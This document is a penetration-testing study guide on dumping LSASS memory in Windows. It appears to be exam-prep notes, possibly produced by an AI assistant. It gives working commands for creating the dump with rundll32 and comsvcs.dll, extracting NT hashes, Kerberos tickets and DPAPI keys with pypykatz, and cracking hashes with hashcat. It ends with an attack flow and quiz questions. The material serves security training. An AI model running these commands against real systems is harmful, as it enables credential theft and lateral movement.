# What is LSASS?

## LSASS (Local Security Authority Subsystem Service)

LSASS (`lsass.exe`) is one of the **most important Windows processes**.

It is responsible for:

- User Authentication
    
- Password Validation
    
- Security Policy Enforcement
    
- Access Token Creation
    
- Storing Credentials in Memory
    
- Writing Security Logs
    

Think of LSASS as the **security brain of Windows**.

---

## Windows Authentication Overview

```text
                 User Login
                     │
                     ▼
              WinLogon.exe
                     │
                     ▼
                LSASS.exe
                     │
      ┌──────────────┼──────────────┐
      │              │              │
      ▼              ▼              ▼
    NTLM         Kerberos       Security
 Authentication Authentication  Policies
      │              │
      ▼              ▼
Password Hashes   Tickets
```

---

# What Happens When a User Logs In?

Once a user logs into Windows, LSASS performs several actions.

```text
User Login
     │
     ▼
Authenticate User
     │
     ▼
Cache Credentials
     │
     ▼
Create Access Token
     │
     ▼
Apply Security Policies
     │
     ▼
Write Security Logs
```

---

## LSASS Stores

- NTLM Hashes
    
- Kerberos Tickets
    
- DPAPI Keys
    
- Cached Credentials
    
- Sometimes Cleartext Passwords
    
- Security Tokens
    

Because of this...

> **Attackers love dumping LSASS memory.**

---

# Why Attack LSASS?

Unlike SAM...

SAM only stores

```text
Password Hashes
```

LSASS may contain

```text
Password Hashes

Cleartext Passwords

Kerberos Tickets

DPAPI Keys

Authentication Tokens
```

This makes LSASS much more valuable.

---

# Memory Dump

Instead of attacking LSASS directly...

Create a copy of its memory.

```text
Windows
     │
     ▼
LSASS.exe
     │
     ▼
Memory Dump
(lsass.dmp)
     │
     ▼
Offline Credential Extraction
```

Advantages

✔ Faster

✔ Safer

✔ Less time on target

✔ Offline analysis

---

# Method 1 — Task Manager

Requires

- GUI Access
    
- Interactive Session
    

---

## Steps

```text
Task Manager

↓

Processes

↓

Local Security Authority Process

↓

Right Click

↓

Create Dump File
```

Windows creates

```text
lsass.DMP
```

Location

```text
%temp%
```

Transfer this file to Kali.

---

# Method 2 — Rundll32 + Comsvcs.dll

This method works entirely from the command line.

Useful when

✔ You have CMD

✔ You have PowerShell

✔ No GUI available

---

## Step 1

Find LSASS PID

### CMD

```cmd
tasklist /svc
```

Example

```text
lsass.exe      672
```

---

### PowerShell

```powershell
Get-Process lsass
```

Output

```text
Id

672
```

The PID may be different on every machine.

---

## Step 2

Create Dump

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Breakdown

```text
rundll32
     │
Runs DLL Functions

↓

comsvcs.dll

↓

MiniDump

↓

Dump LSASS Memory

↓

C:\lsass.dmp
```

---

## Important

Modern Antivirus products usually detect

```text
rundll32

+

comsvcs.dll

+

MiniDump
```

as malicious.

Therefore

AV may block the dump.

---

# Transfer Dump

After dumping

```text
lsass.dmp
```

Move it to Kali.

Same transfer techniques used in the previous **SAM Dumping** section apply here.

---

# Extract Credentials with Pypykatz

Tool

```text
Pypykatz
```

Think of it as

```text
Mimikatz

↓

Python Version

↓

Runs on Linux
```

---

## Why Pypykatz?

Mimikatz

✔ Windows Only

Pypykatz

✔ Linux

✔ Offline

✔ Safer

---

## Command

```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

Workflow

```text
lsass.dmp

↓

Pypykatz

↓

Extract Credentials

↓

Hashes

Tickets

Passwords

DPAPI Keys
```

---

# What Does Pypykatz Extract?

The output contains multiple authentication packages.

```text
MSV

WDIGEST

Kerberos

DPAPI
```

Each contains different credential information.

---

# 1. MSV

Example

```text
Username

Domain

NT Hash

SHA1 Hash

SID
```

Example Output

```text
Username: bob

NT:
64f12cddaa88057e06a81b54e73b949b
```

---

## What is MSV?

MSV

↓

Microsoft Authentication Package

It validates logins against

```text
SAM Database
```

Information Retrieved

✔ Username

✔ SID

✔ NT Hash

✔ SHA1 Hash

---

# MSV Diagram

```text
User Login

↓

MSV

↓

Checks SAM

↓

Returns NT Hash
```

---

# 2. WDIGEST

Example

```text
username bob

password None
```

---

## What is WDIGEST?

Older Windows authentication protocol.

Supported by

- Windows XP
    
- Windows 7
    
- Windows Server 2003
    
- Windows Server 2012
    

Older Windows versions cached

```text
Cleartext Passwords
```

inside LSASS.

---

Modern Windows

```text
WDIGEST

↓

Disabled

↓

No Cleartext Password
```

If enabled...

Pypykatz may recover

```text
Username

Password
```

directly.

---

# WDIGEST Diagram

```text
Old Windows

↓

LSASS

↓

Stores Password

↓

Attacker Dumps LSASS

↓

Gets Cleartext Password
```

---

# 3. Kerberos

Example

```text
Username

Domain
```

---

## What is Kerberos?

Kerberos is Microsoft's primary authentication protocol for Active Directory.

Instead of sending passwords repeatedly

Users receive

```text
Tickets
```

Diagram

```text
User Login

↓

Active Directory

↓

Ticket Granted

↓

Access Resources

↓

No Password Needed Again
```

LSASS stores

- Kerberos Tickets
    
- Encryption Keys
    
- PINs
    

These can later be abused for lateral movement.

---

# 4. DPAPI

Example

```text
masterkey

sha1_masterkey
```

---

## What is DPAPI?

DPAPI

↓

Data Protection API

Used to encrypt

- Chrome Passwords
    
- Outlook Passwords
    
- RDP Credentials
    
- VPN Passwords
    
- Credential Manager
    

---

Diagram

```text
Chrome Password

↓

DPAPI Encrypts

↓

Saved on Disk

↓

LSASS Stores MasterKey

↓

Pypykatz Extracts MasterKey

↓

Passwords Can Be Decrypted
```

---

# Crack the NT Hash

Example Hash

```text
64f12cddaa88057e06a81b54e73b949b
```

Hashcat

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

Result

```text
Password1
```

---

# Attack Flow

```text
Gain Administrator
        │
        ▼
Locate LSASS
        │
        ▼
Find PID
        │
        ▼
Create lsass.dmp
        │
        ▼
Transfer Dump
        │
        ▼
Run Pypykatz
        │
        ▼
Extract Credentials
        │
        ▼
Crack NT Hash
        │
        ▼
Reuse Credentials
```

---

# LSASS vs SAM

|Feature|SAM|LSASS|
|---|---|---|
|Local NT Hashes|✅|✅|
|Cleartext Passwords|❌|Sometimes|
|Kerberos Tickets|❌|✅|
|DPAPI Keys|❌|✅|
|Authentication Tokens|❌|✅|
|Offline Dump|✅|✅|

---

# Important Commands

## Find LSASS PID (CMD)

```cmd
tasklist /svc
```

---

## Find LSASS PID (PowerShell)

```powershell
Get-Process lsass
```

---

## Dump LSASS

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

---

## Extract Credentials

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

---

## Crack NT Hash

```bash
hashcat -m 1000 HASH /usr/share/wordlists/rockyou.txt
```

---

# HTB / Exam Questions

### Which Windows process stores authentication credentials in memory?

✅ **LSASS (`lsass.exe`)**

---

### Which command finds the LSASS PID from CMD?

```cmd
tasklist /svc
```

---

### Which PowerShell command finds the LSASS PID?

```powershell
Get-Process lsass
```

---

### Which DLL is used to create an LSASS dump?

✅ **`comsvcs.dll`**

---

### Which Windows executable invokes `MiniDump`?

✅ **`rundll32.exe`**

---

### Which file is created after dumping LSASS?

```text
lsass.dmp
```

---

### Which tool extracts credentials from an LSASS dump on Linux?

✅ **Pypykatz**

---

### Which authentication package may expose cleartext passwords on older Windows systems?

✅ **WDIGEST**

---

### Which authentication protocol uses tickets instead of repeatedly sending passwords?

✅ **Kerberos**

---

### Which authentication package validates logons against the SAM database?

✅ **MSV**

---

# 1-Minute Revision Sheet

```text
LSASS = Local Security Authority Subsystem Service

Stores:
✔ NTLM Hashes
✔ Kerberos Tickets
✔ DPAPI Keys
✔ Authentication Tokens
✔ Sometimes Cleartext Passwords

Dump Methods:
• Task Manager
• rundll32 + comsvcs.dll

Find PID:
tasklist /svc
Get-Process lsass

Create Dump:
rundll32 ... MiniDump

Output:
lsass.dmp

Analyze:
pypykatz lsa minidump lsass.dmp

Hashcat:
Mode 1000 → NTLM

Authentication Packages:
MSV → NT Hashes
WDIGEST → Cleartext Passwords (Older Windows)
Kerberos → Tickets
DPAPI → Master Keys
```

These notes preserve the important concepts and commands from your uploaded material while adding detailed explanations, diagrams, and exam-oriented summaries.